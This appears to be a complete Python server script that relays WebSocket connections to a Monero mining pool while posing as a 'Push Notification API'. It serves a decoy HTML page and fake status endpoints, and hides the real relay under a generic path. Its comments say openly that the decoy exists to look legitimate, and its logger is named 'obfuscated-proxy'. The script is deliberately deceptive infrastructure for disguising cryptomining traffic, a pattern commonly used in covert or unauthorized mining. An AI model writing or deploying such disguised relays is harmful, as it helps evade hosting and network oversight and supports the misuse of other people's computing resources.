#!/usr/bin/env python3
import asyncio
import logging
import os
import random
import time
from urllib.parse import urlparse, parse_qs

from aiohttp import web
import websockets  # still imported but not used for pool connection now

# ---------- Configuration ----------
PROXY_TARGET = os.environ.get('PROXY_TARGET', 'pool.supportxmr.com:5555')
ACCESS_TOKEN = os.environ.get('ACCESS_TOKEN')          # Optional but recommended
PORT = int(os.environ.get('PORT', 10000))
MAX_CONNECTIONS = int(os.environ.get('MAX_CONNECTIONS', 500))

# Fake site content (looks like a real API)
FAKE_SITE = """
<!DOCTYPE html>
<html>
<head><title>Push Notification API</title></head>
<body>
<h1>Push Notification Service v2.3</h1>
<p>WebSocket endpoint: /api/v1/push</p>
<p>Status: <span style="color:green">operational</span></p>
</body>
</html>
"""

# ---------- Logging ----------
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger('obfuscated-proxy')

# ---------- Connection tracking ----------
active_connections = 0
semaphore = asyncio.Semaphore(MAX_CONNECTIONS)

# ---------- WebSocket handler (now forwards to plain TCP) ----------
async def websocket_handler(request):
    global active_connections
    ws = web.WebSocketResponse()
    await ws.prepare(request)

    # Optional token authentication
    if ACCESS_TOKEN:
        query = parse_qs(request.query_string)
        token = query.get('token', [None])[0]
        if token != ACCESS_TOKEN:
            logger.warning(f"Unauthorized attempt from {request.remote}")
            await ws.close()
            return ws

    async with semaphore:
        active_connections += 1
        client = request.remote
        logger.info(f"New client: {client} | Active: {active_connections}")

        # Parse pool host and port
        pool_host, pool_port_str = PROXY_TARGET.split(':')
        pool_port = int(pool_port_str)

        # Connect to the mining pool via plain TCP (Stratum protocol)
        try:
            pool_reader, pool_writer = await asyncio.open_connection(
                pool_host, pool_port,
                ssl=False  # pool.supportxmr.com:5555 is plain TCP
            )
            logger.info(f"Connected to pool {PROXY_TARGET} for {client}")
        except Exception as e:
            logger.error(f"Pool connection failed for {client}: {e}")
            await ws.close()
            return ws

        # Forward data between WebSocket and TCP socket
        async def ws_to_tcp():
            try:
                async for msg in ws:
                    if msg.type == web.WSMsgType.BINARY:
                        pool_writer.write(msg.data)
                    elif msg.type == web.WSMsgType.TEXT:
                        pool_writer.write(msg.data.encode())
                    await pool_writer.drain()
            except Exception as e:
                logger.debug(f"ws_to_tcp error: {e}")
            finally:
                pool_writer.close()
                await pool_writer.wait_closed()

        async def tcp_to_ws():
            try:
                while True:
                    data = await pool_reader.read(4096)
                    if not data:
                        break
                    await ws.send_bytes(data)
            except Exception as e:
                logger.debug(f"tcp_to_ws error: {e}")
            finally:
                await ws.close()

        # Run both forwarding tasks concurrently
        task1 = asyncio.create_task(ws_to_tcp())
        task2 = asyncio.create_task(tcp_to_ws())

        done, pending = await asyncio.wait(
            [task1, task2],
            return_when=asyncio.FIRST_COMPLETED
        )
        for task in pending:
            task.cancel()

        active_connections -= 1
        logger.info(f"Client disconnected: {client} | Active: {active_connections}")

    return ws

# ---------- Health check endpoint ----------
async def health_check(request):
    return web.json_response({
        "status": "healthy",
        "active_connections": active_connections,
        "uptime": time.time() - start_time,
        "version": "2.3.1"
    })

# ---------- Fake API endpoints ----------
async def root_handler(request):
    return web.Response(text=FAKE_SITE, content_type='text/html')

async def api_status(request):
    return web.json_response({
        "service": "push-notification",
        "version": "2.3.1",
        "ws_endpoint": "/api/v1/push"
    })

# ---------- Main ----------
start_time = time.time()

async def main():
    app = web.Application()
    # Fake website to look legitimate
    app.router.add_get('/', root_handler)
    app.router.add_get('/api/status', api_status)
    app.router.add_get('/health', health_check)
    # Real WebSocket endpoint hidden under a generic path
    app.router.add_get('/api/v1/push', websocket_handler)

    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', PORT)
    await site.start()

    logger.info(f"Service running on port {PORT}")
    logger.info(f"Fake site: http://localhost:{PORT}/")
    logger.info(f"WebSocket endpoint: ws://localhost:{PORT}/api/v1/push")

    await asyncio.Event().wait()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Shutting down")
